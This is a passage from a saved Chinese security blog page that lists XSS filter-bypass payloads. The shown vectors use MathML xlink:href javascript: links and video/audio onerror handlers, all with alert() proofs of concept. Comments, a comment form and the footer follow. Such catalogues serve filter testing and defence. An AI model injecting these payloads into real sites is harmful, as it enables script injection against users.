+&lt;math href="javascript:javascript:alert(1)"&gt;CLICKME&lt;/math&gt; <br/>
+&lt;math&gt;&lt;y/xlink:href=javascript:alert(51)&gt;test1 <br/>
+&lt;math&gt; &lt;maction actiontype="statusline#http://wangnima.com" <br/>
+xlink:href="javascript:alert(49)"&gt;CLICKME&lt;/maction&gt; &lt;/math&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【video标签】 </span><br/>
+&lt;video&gt;&lt;source onerror="alert(1)"&gt; <br/>
+&lt;video src=x onerror=alert(48)&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">【audio标签】 </span><br/>
+&lt;audio src=x onerror=alert(47)&gt;<br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">姿势的介绍就在这里结束了。 </span><br/>
+<span style="font-family:Verdana, 'Microsoft YaHei', Helvetica, Arial, sans-serif;font-size:14px;line-height:22px;background-color:#FFFFFF;">说句题外话 在这些标签里面凡是出现在on*事件值里面的javascript:都是多余的。但是这个对测试者来说是很方便的。因为你可以通过一个payload来测试好几个黑名单成员</span>
+</br></br></p>
+</div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-1437">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/a05c97e82e4c8bda85ce5abb1d87e902.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.960n.com/" target="_blank">天妈博客</a>
+<time datetime="2013年10月1日 13:33" itemprop="datePublished">
+                            2013 十月 01 13:33
+                        </time>
+<a href="javascript:reply_to('1437', '天妈博客')">回复</a>
+</p>
+<p class="comment-meta">看天书。</p>
+</div>
+</div>
+<div class="row" id="comment-1433">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/0a92e0252c2d1aafa0d0d1d55a0ef6ba.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">企业彩信平台</a>
+<time datetime="2013年9月30日 10:56" itemprop="datePublished">
+                            2013 九月 30 10:56
+                        </time>
+<a href="javascript:reply_to('1433', '企业彩信平台')">回复</a>
+</p>
+<p class="comment-meta">我们总是很忙！</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="f0067061b6d0b52296ff010aa7340d7dda81f5c8"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/f0067061b6d0b52296ff010aa7340d7dda81f5c8"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="279">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="YmOSE1bJa2bpEUFfBXnKfy5dkZla4EEFwG9osvnYBP5OEz3upeRuOc7it3OiN8tP"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./那些年我们没能bypass的xss filter[from wooyun]  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
